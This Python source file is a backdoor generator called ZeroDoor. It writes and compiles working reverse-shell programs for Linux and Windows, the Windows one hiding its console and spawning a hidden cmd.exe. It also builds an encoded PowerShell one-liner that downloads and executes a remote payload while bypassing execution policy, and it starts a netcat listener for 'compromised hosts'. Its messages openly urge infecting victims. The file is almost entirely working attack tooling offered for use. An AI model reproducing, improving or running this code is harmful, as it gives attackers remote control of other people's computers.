#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os 
import sys
import socket

if sys.version_info > (3, 0):
    raw_input = input

def main():
    print ("""
_____________________________________________________________ 
|                                                   ^^^^^^^^\ |
|                                                   |       | |
|      *  ZeroDoor Backdoor Generator *             |_ __   | | 
|                                                   (.(. )  | |
|       ~ Created By Souhardya Sardar  ~    _      (_       )  
|            Happy Hacking to all :)        \\      /___/'  /   
|                                           _\\_      \    |   |
|                                          ((   )     /====|  |
|                                           \  <.__._-      \ |
|___________________________________________ <//___.         ||


[---]                 ZeroDoor Backdoor Generator                           [---]
[---]                                                                       [---]
[---]                  Created by Souhardya Sardar                          [---]
[---]                    github.com/Souhardya                               [---]



LEGAL WARNING: While this may be helpful for some, there are significant risks.
You are hereby allowed to cause havoc with this but the owner won't be held 
responsible for any damage you cause :) if you get in trouble I don't care
 

1. BackDoors 
2. Listener


""")

    global option
    option = raw_input('Choose from the following options #~: ')
 
    if option:
        if option == '1':
            backdoor_generator()

        elif option == '2':
            banner()
            listener()



def backdoor_generator():
    
    print ("""

                ,----------------,                ,---------, 
            ,--------------------------,        ,"        ," |
          ,"                       ,"  |       ,"        ,"  |
         +------------------------+ |  |     ,"        ,"    |
         |  .--------------------.  |  |     +---------+     |
         |  |                    |  |  |     | -==----'|     |
         |  |$>wget backdoors    |  |  |     |         |     |
         |  | chmod +x backdoors |  |  |/----|`---=    |     |
         |  |  ./backdoors pwn   |  |  |     |==== ooo |      ;
         |  |                    |  |  |     |(((( [33]|    ,"
         |  `--------------------'  |,"      | |((((   |  ,"
         +-----------------------+  ;;       | |       |,"     
            /_)______________(_/  //'       +.---------+
       ___________________________/___  
      /  oooooooooooooooo  .o.  oooo /,   
     / ==ooooooooooooooo==.o.  ooo= //   
    /_==__==========__==_ooo__ooo=_/'   
    `-----------------------------'

                   ~ 3 Immersive Backdoors ~ 


1. Linux Backdoor Generate
2. Windows Generic Backdoor
3. Powershell Liner Backdoor




""")

    select = raw_input( "Select from the following options ")

    if(select == '1'):
        print ("""


██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗    ██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ██████╗ 
██║     ██║████╗  ██║██║   ██║╚██╗██╔╝    ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝     ██████╔╝███████║██║     █████╔╝ ██║  ██║██║   ██║██║   ██║██████╔╝
██║     ██║██║╚██╗██║██║   ██║ ██╔██╗     ██╔══██╗██╔══██║██║     ██╔═██╗ ██║  ██║██║   ██║██║   ██║██╔══██╗
███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗    ██████╔╝██║  ██║╚██████╗██║  ██╗██████╔╝╚██████╔╝╚██████╔╝██║  ██║
╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝


                            ~ Linux Reverse Shell Gen ~
""")

        host = raw_input("[?] Enter your IP (LHOST): " )
        port = raw_input("[?] Enter your port (LPORT): ")
        linux_shell(host, port)
        os.system("gcc .shell.c -o backdoor -pthread && rm -rf .shell.c")
        print ("[*] Backdoor Generated now go infect lol ...[*]")

    if(select == '2'):
        print ("""



██╗    ██╗██╗███╗   ██╗    ██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ██████╗ 
██║    ██║██║████╗  ██║    ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
██║ █╗ ██║██║██╔██╗ ██║    ██████╔╝███████║██║     █████╔╝ ██║  ██║██║   ██║██║   ██║██████╔╝
██║███╗██║██║██║╚██╗██║    ██╔══██╗██╔══██║██║     ██╔═██╗ ██║  ██║██║   ██║██║   ██║██╔══██╗
╚███╔███╔╝██║██║ ╚████║    ██████╔╝██║  ██║╚██████╗██║  ██╗██████╔╝╚██████╔╝╚██████╔╝██║  ██║
 ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                                                                                               
                            ~ Windows Reverse Shell Gen ~
                                
""")       

        host = raw_input( "[?] Enter your IP (LHOST): " )
        port = raw_input("[?] Enter your port (LPORT):" )
        windows_reverse(host, port)
        os.system("/usr/bin/i686-w64-mingw32-gcc winshell.c -o backdoor.exe -lws2_32 && rm -rf winshell.c")
        print ("[*] Backdoor Generated now go infect lol ...[*]")
 
    if(select == '3'):
        print ("""

██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ██████╗  ██████╗  ██████╗ ██████╗ 
██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝██║  ██║██║   ██║██║   ██║██████╔╝
██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗██║  ██║██║   ██║██║   ██║██╔══██╗
██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║██████╔╝╚██████╔╝╚██████╔╝██║  ██║
╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                                                                             
                    ~ Base64 Encoded Powershell Backdoor gen ~
                              (Mostly Undetectable)

""")

        powershell_payload()



    


def linux_shell(host, port):
    print ("[*] Starting Process.. [*]")
    with open(".shell.c", "w") as file:
        file.write('''

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
 
int main (int argc, char **argv)
{
  int scktd;
  struct sockaddr_in client;
 
  client.sin_family = AF_INET;
  client.sin_addr.s_addr = inet_addr("%s");
  client.sin_port = htons(%s);

  scktd = socket(AF_INET,SOCK_STREAM,0);
  connect(scktd,(struct sockaddr *)&client,sizeof(client));

  dup2(scktd,0); // STDIN
  dup2(scktd,1); // STDOUT
  dup2(scktd,2); // STDERR

  execl("/bin/sh","sh","-i",NULL,NULL);

  return 0;
}
''' % (host, port))




#Credits to BlackBox Hacker ( Xabber Lord ) he wrote this a whole back years ago ..... people copied it without giving credits
#Permission taken and thanked too :) 
def windows_reverse(host, port):
    with open("winshell.c", "w") as file:
        file.write('''
#include <winsock2.h>
#include <stdio.h>
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib,"ws2_32")
  WSADATA wsaData;
  SOCKET Winsock;
  SOCKET Sock;
  struct sockaddr_in hax;
  char ip_addr[16];
  STARTUPINFO ini_processo;
  PROCESS_INFORMATION processo_info;
//int main(int argc, char *argv[])
int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdParam, int iCmdShow)
{
    FreeConsole();
    WSAStartup(MAKEWORD(2,2), &wsaData);
    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
                
    struct hostent *host;
    host = gethostbyname("'''+host+'''");
    strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi("'''+port+'''"));
    hax.sin_addr.s_addr = inet_addr(ip_addr);
    WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);
    memset(&ini_processo,0,sizeof(ini_processo));
    ini_processo.cb=sizeof(ini_processo);
    ini_processo.dwFlags=STARTF_USESTDHANDLES;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
    CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&ini_processo,&processo_info);
}
''')


                         
def powershell_payload(): # Powershell payload creation

    payload = ("""

#!/bin/bash


echo "Set LHOST: \c"
read ip

echo "Specify payload name hosted on your web server : \c"
read payload

scriptblock="iex (New-Object Net.WebClient).DownloadString("http://$ip/$payload")"

encode="`echo $scriptblock `"

command="cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode"

echo $command


        """)

    os.system(payload)


def banner():
    print ("""

 _______________          |*\_/*|________ 
|  ___________  |        ||_/-\_|______  | 
| |           | |        | |           | | 
| |   0   0   | |        | |   0   0   | | 
| |     -     | |-> -> ->| |     -     | | 
| |   \___/   | |        | |   \___/   | | 
| |___     ___| |        | |___________| | 
|_____|\_/|_____|        |_______________| 
 _|__|/ \|_|_.............._|________|_
/ ********** \            / ********** \ 
 ************ \          / ************ \   
     
~ A Simple Listener To Accept Connections From Compromised Hosts ~


""")

def listener():

  try:
    port = int(raw_input("Specify port to interact:"))
    os.system("nc -l %s" %port)

  except:
    print ("[*] Listener could not be initiated [*]")


  
if __name__ == '__main__':
    main()
